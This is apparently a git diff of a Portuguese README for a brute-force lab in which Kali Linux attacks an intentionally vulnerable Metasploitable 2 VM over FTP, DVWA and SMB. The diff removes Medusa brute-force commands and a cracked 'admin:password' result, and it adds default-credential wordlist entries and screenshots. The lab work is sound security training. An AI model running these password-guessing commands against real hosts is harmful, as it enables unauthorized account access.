@@ -24,18 +24,29 @@ Implementação prática de cenários de ataques de força bruta utilizando **Ka
 
 ## 🏗️ Configuração do Ambiente
 
-### Pré-requisitos
-```bash
-# No Kali Linux
-sudo apt update
-sudo apt install medusa enum4linux smbclient
+### Topologia da Rede:
+
+    Kali Linux (Atacante)
+    ↓
+    VirtualBox Host-Only Network
+    ↓  
+    Metasploitable 2 (Alvo)
+        ├── FTP (porta 21)
+        ├── SSH (porta 22) 
+        ├── HTTP/DVWA (porta 80)
+        └── SMB (porta 445)
+
 
 # ⚔️ Ataques Realizados
 ## 1. 🗂️ Ataque FTP (Porta 21)
 
-Comando:
-    
-    medusa -h 192.168.122.128 -U wordlists/ftp_users.txt -P wordlists/ftp_passwords.txt -M ftp -t 2 -O logs/ftp_attack.log
+| **Ataque:** | **Logs do ataque simples:**
+| --- | --- |
+| ![Medusa Ataque FTP](screenshots/medusaFtp.png) | ![Medusa FTP](screenshots/logsFtpSimples.png) |
+
+| **Validação de Acesso:** |
+| --- | 
+| ![valifacaoAcesso](screenshots/ftpSucesso.png) |
 
 
 Wordlists:
@@ -44,11 +55,16 @@ Wordlists:
     msfadmin
     admin
     root
+    anonymous
+    test
+    user
 
     # ftp_passwords.txt  
     msfadmin
     password
     123456
+    admin
+    12345
 
 Resultado:
 
@@ -56,21 +72,21 @@ Resultado:
 
 ## 2. 🌐 Ataque HTTP/DVWA (Porta 80)
 
-Comando:
-
-    medusa -h 192.168.122.128 -U wordlists/dvwa_users.txt -P wordlists/dvwa_passwords.txt -M http \
-    -m DIR:/dvwa/login.php \
-    -m FORM:"username=^USER^&password=^PASS^&Login=Login" \
-    -m DENY-SIGNAL:"Login failed" \
-    -O logs/dvwa_attack.log
+| **Comando em Execução:** | **Logs do ataque:** |
+| --- | --- |
+| ![Medusa DVWA](screenshots/medusaDvwa.png) | ![DVWA Logs](screenshots/dvwaLogs.png) |
 
 
-Resultado:
+## 3. 💻 Ataque SMB (Porta 445)
 
-    ✅ admin:password [SUCCESS]
+| **Ataque em Andamento:** | **Descoberta de Compartilhamentos:**
+| --- | --- |
+| ![Medusa SMB](screenshots/medusaSmb.png) | ![SMB Shares](screenshots/validaçaoSmb.png) |
 
+| **Acesso Confirmado:** |
+| --- |
+| ![SMB Access](screenshots/validaçao2Smb.png) |
 
-# 3. 💻 Ataque SMB (Porta 445)
 
 Comando:
 
@@ -159,8 +175,6 @@ Para Administradores de Sistema
     │   ├── ftp_attack.log
     │   ├── dvwa_attack.log
     │   └── smb_attack.log
-    ├── 📁 scripts/
-    │   └── brute_force_test.sh
     └── 📁 screenshots/
         ├── ftp_success.png
         ├── dvwa_access.png
